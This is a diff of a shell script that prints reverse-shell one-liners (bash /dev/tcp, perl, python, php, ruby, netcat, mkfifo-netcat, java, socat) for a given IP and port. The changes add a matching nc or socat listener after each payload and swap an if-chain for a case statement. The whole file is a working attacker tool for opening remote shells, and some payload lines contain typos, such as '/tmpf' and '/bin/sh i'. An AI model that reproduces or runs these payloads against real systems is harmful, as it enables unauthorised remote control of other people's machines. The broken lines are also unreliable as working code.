@@ -2,7 +2,7 @@
 
 usage()
 {
-	echo -e "usage: $0 -s <Shell> -i <IP Address> -p <Port>\n"
+	echo -e "usage: $0 -i <IP Address> -p <Port> -s <Shell>\n"
        	echo -e "-i\tIP Address"
 	echo -e "\t\tex. 192.168.0.10"
 	echo -e "-p\tPort number"
@@ -21,44 +21,58 @@ usage()
 
 bash_shell()
 {
-	echo -e "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1"
+	echo -e "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1\n"
+	nc -nvlp $port
 }
 
 perl_shell()
 {
-	echo -e "perl -e 'use Socket;\$i="\"$ip\"";\$p="$port";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+	echo -e "perl -e 'use Socket;\$i="\"$ip\"";\$p="$port";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n"
+	nc -nvlp $port
 }
 
 python_shell()
 {
-	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip\"","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip\"","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"
+	nc -nvlp $port
 }
 
 php_shell()
 {
-	echo -e "php -r '\$sock=fsockopen("\"$ip\"","$port");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+	echo -e "php -r '\$sock=fsockopen("\"$ip\"","$port");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n"
+	nc -nvlp $port
 }
 
 ruby_shell()
 {
-	echo -e "ruby -rsocket -e'f=TCPSocket.open("\"$ip\"","$port").to_i;exec sprintf(\"/bin/sh i <&%d >&%d 2>&%d\",f,f,f)'"
+	echo -e "ruby -rsocket -e'f=TCPSocket.open("\"$ip\"","$port").to_i;exec sprintf(\"/bin/sh i <&%d >&%d 2>&%d\",f,f,f)'\n"
+	nc -nvlp $port
 }
 
 nc_shell()
 {
-	echo -e "nc -e /bin/sh $ip $port"
+	echo -e "nc -e /bin/sh $ip $port\n"
+	nc -nvlp $port
 }
 
 oldnc_shell()
 {
-	echo -e "rm /tmpf;mkfifo /tmpf;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+	echo -e "rm /tmpf;mkfifo /tmpf;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f\n"
+	nc -nvlp $port
 }
 
 java_shell()
 {
 	echo -e "r = Runtime.getRuntime()"
 	echo -e "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
-	echo -e "p.waitFor()"
+	echo -e "p.waitFor()\n"
+	nc -nvlp $port
+}
+socat_shell()
+{
+	echo -e "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port\n"
+	socat file:`tty`,raw,echo=0 tcp-listen:$port
+
 }
 
 while getopts "i:p:s:h" argument; do
@@ -79,32 +93,36 @@ case "${argument}" in
 esac
 done
 
-if [ $shell = "bash" ]
-then
-	bash_shell
-elif [ $shell = "perl" ]
-then
-	perl_shell
-elif [ $shell = "python" ]
-then
-	python_shell
-elif [ $shell = "php" ]
-then
-	php_shell
-elif [ $shell = "ruby" ]
-then
-	ruby_shell
-elif [ $shell = "netcat" -o $shell = "nc" ]
-then
-	nc_shell
-elif [ $shell = "netcat-old" -o $shell = "nc-old" ]
-then
-	oldnc_shell
-elif [ $shell = "java" ]
-then
-	java_shell
-else
-	echo ERROR: invalid options 1>&2
-	usage
-	exit 1
-fi
+case "$shell" in
+	bash)
+		bash_shell
+		;;
+	perl)
+		perl_shell
+		;;
+	python)
+		python_shell
+		;;
+	php)
+		php_shell
+		;;
+	ruby)
+		ruby_shell
+		;;
+	netcat|nc)
+		nc_shell
+		;;
+	netcat-old|nc-old)
+		oldnc_shell
+		;;
+	java)
+		java_shell
+		;;
+	socat)
+		socat_shell
+		;;
+	*)
+		echo ERROR: invalid options 1>&2
+		usage
+		;;
+esac
